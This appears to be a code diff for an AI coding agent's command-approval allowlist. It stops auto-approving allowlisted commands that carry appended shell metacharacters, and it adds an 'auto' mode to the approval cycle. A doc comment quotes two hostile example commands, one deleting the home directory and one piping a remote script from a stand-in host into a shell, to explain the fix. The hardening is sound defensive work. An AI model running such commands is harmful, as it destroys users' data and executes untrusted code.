@@ -9,10 +9,8 @@
 
 import type { ApprovalRequest } from "../types.js";
 import { getBridgeHooks } from "./state.js";
-import {
-  CYCLE_MODES,
-  type ApprovalMode,
-} from "../../config/approvalMode.js";
+import { SHELL_METACHARACTER_PATTERN } from "../../fileProxy/constants.js";
+import { CYCLE_MODES, type ApprovalMode } from "../../config/approvalMode.js";
 
 export type {
   ApprovalMode,
@@ -36,13 +34,27 @@ export type AllowlistRule =
 const normalize = (value: string): string =>
   value.trim().replace(/\s+/g, " ").toLowerCase();
 
+/**
+ * True when `command` matches an allowlisted `pattern`, exactly or as a
+ * same-family prefix (e.g. `npm test` covers `npm test --watch`).
+ *
+ * @remarks
+ * The prefix branch requires the *full* incoming command to contain no
+ * shell metacharacter ({@link SHELL_METACHARACTER_PATTERN}) — otherwise
+ * "always allow `npm test`" would also silently approve
+ * `npm test && rm -rf ~` or `npm test; curl evil.sh | sh`, since both start
+ * with the approved prefix. An exact repeat of a pattern that itself
+ * contains a metacharacter still matches (nothing new was appended); only
+ * *extending* such a command re-prompts.
+ */
 const commandMatches = (command: string, pattern: string): boolean => {
   const normalizedCommand = normalize(command);
   const normalizedPattern = normalize(pattern);
   if (normalizedPattern.length === 0) return false;
+  if (normalizedCommand === normalizedPattern) return true;
   return (
-    normalizedCommand === normalizedPattern ||
-    normalizedCommand.startsWith(`${normalizedPattern} `)
+    normalizedCommand.startsWith(`${normalizedPattern} `) &&
+    !SHELL_METACHARACTER_PATTERN.test(normalizedCommand)
   );
 };
 
@@ -92,7 +104,8 @@ export class SessionAllowlist {
     if (request.type === "runSkip") {
       return this.rules.some(
         (rule) =>
-          rule.type === "runSkip" && commandMatches(request.command, rule.pattern),
+          rule.type === "runSkip" &&
+          commandMatches(request.command, rule.pattern),
       );
     }
     return this.rules.some(
@@ -135,7 +148,7 @@ export const getApprovalMode = (): ApprovalMode => sessionApprovalMode;
  *
  * @remarks
  * Notifies the Ink UI via `onApprovalModeChange` so the footer stays in
- * lockstep with `/set approval` and Shift+Tab.
+ * lockstep with Shift+Tab — the only way the mode ever changes.
  *
  * @param mode - Next mode.
  */
@@ -145,10 +158,11 @@ export const setSessionApprovalMode = (mode: ApprovalMode): void => {
 };
 
 /**
- * Cycles `default → accept_edits → plan → default`. While busy, `plan` is
- * skipped so a running task cannot be switched into a mode that would
- * strand it at confirm-plan. `auto` and `bypass` are not in the cycle —
- * Shift+Tab from either returns `default`.
+ * Cycles `default → accept_edits → plan → auto → default`. While busy,
+ * landing on `plan` is skipped in favor of `default` so a running task
+ * cannot be switched into a mode that would strand it at confirm-plan —
+ * `auto` has no such restriction, since it's useful for un-sticking a
+ * stuck prompt mid-task.
  *
  * @param current - Mode before the keypress.
  * @param busy - Whether a task is in flight.
@@ -156,7 +170,7 @@ export const setSessionApprovalMode = (mode: ApprovalMode): void => {
  *
  * @example
  * ```ts
- * cycleApprovalMode("accept_edits", true); // "default" — plan skipped
+ * cycleApprovalMode("plan", true); // "auto" — plan's busy-skip doesn't apply here
  * cycleApprovalMode("auto", false); // "default"
  * ```
  */
@@ -174,4 +188,3 @@ export const cycleApprovalMode = (
   }
   return next;
 };
-
